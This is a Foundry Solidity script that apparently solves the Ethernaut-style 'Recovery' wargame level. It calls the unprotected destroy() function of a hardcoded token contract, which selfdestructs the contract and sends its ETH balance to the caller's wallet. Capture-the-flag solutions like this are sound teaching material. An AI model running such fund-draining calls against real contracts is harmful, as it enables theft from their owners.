// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

contract RecoveryScript is Script {

    SimpleToken private immutable token = SimpleToken(payable(0xbdd0F360d68D284aAdA17B10161a3141cF739e6E));

    /**
     * Solution: The easiest way is to scan through etherscan to find the contract with 0.0001 ETH.
     * Once we have found the contract address we can execute selfdestruct and send the funds to our wallet.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("1. Balance of token", address(token).balance);
        token.destroy(payable(vm.envAddress("WALLLET_ADDRESS")));
        console.log("2. Balance of token", address(token).balance);

        vm.stopBroadcast();
    }
}